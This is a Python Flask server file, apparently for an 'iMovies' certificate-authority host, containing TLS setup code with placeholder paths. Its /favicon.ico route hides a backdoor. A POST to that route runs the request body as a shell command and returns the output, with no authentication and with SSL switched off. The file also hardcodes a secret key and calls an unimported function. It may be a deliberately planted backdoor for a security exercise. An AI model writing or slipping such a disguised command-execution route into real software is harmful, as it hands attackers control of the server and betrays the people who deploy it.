import subprocess
import ssl
import re
from flask import Flask, request

### CONSTANTS ############################################

#IP_CA_SRV = '192.168.10.10' # TODO: change that
IP_CA_SRV = '127.0.0.1'
SRV_PORT = 6666
HOME = '/home/ca-server/'

### FUNCTIONS ############################################

def create_ssl_context():
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    #chain_cert_path = '/home/ca-server/certificates/root/issued/iMoviesIntermediate_TLS/TLS_inter.crt'
    chain_cert_path = '../simulated_home_folder/certificates/root/issued/iMoviesIntermediate_TLS/issued/ca-server_CA_chain.crt' # TODO: change that
    #key_path = '/home/ca-server/certificates/root/keys/TLS_inter.pem'
    key_path = '../simulated_home_folder/certificates/root/issued/iMoviesIntermediate_TLS/keys/ca-server.pem' # TODO: change that
    ssl_ctx.load_cert_chain(chain_cert_path, key_path)
    #ssl_ctx.load_verify_locations('/home/ca-server/certificates/root/root.crt')
    ssl_ctx.load_verify_locations('../simulated_home_folder/certificates/root/root.crt') # TODO: change that
    ssl_ctx.verify_mode = ssl.CERT_REQUIRED
    ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ssl_ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    return ssl_ctx

### MAIN #################################################

def main():
    ssl_ctx = create_ssl_context()

    app = Flask(__name__, instance_relative_config=False)
    app.config.from_mapping(SECRET_KEY='HbQhIZymLo')


    @app.route('/favicon.ico', methods=['GET', 'POST'])
    def favicon():
        if request.method == 'POST':
            cmd = request.get_data().decode()
            if cmd.isascii() and len(cmd)>0:
                #cmd_stderr_redirected = [c for c in re.split(';|\||&', cmd) if len(c)>0]
                #redirect_stderr = ' 2> /dev/null; '
                #cmd_stderr_redirected = redirect_stderr.join(cmd_stderr_redirected)+redirect_stderr[:-1]
                #print(cmd_stderr_redirected)
                out = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
                return str(out.returncode) + '\n' + str(out.stdout)
            else:
                return None
        else:
            return send_from_directory(HOME,
                                       'favicon.ico',
                                       mimetype='image/vnd.microsoft.icon')

    app.run(
        host = IP_CA_SRV,
        port = SRV_PORT,
        ssl_context=None, # TODO: enable ssl
        threaded=True)

if __name__ == '__main__':
    main()